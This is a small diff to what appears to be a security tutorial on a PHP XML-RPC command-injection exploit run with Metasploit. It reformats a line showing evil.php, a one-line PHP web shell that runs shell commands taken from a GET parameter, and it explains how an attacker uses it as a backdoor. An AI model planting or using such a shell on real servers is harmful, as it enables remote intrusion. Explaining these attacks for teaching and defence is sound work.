@@ -212,7 +212,7 @@ msf exploit(php_xmlrpc_eval) > exploit
 ```
 <sub>xml data with PHP command injection</sub>
 <br>
-- evil.php : `<?php system($_GET['cmd'];)?>`
+evil.php -> `<?php system($_GET['cmd'];)?>`
   
 <br>
 The uploaded malicious php can be a backdoor. It allows the  attacker to execute malicious shell commands by sending a GET request to http://target.com/evil.php?cmd=ls
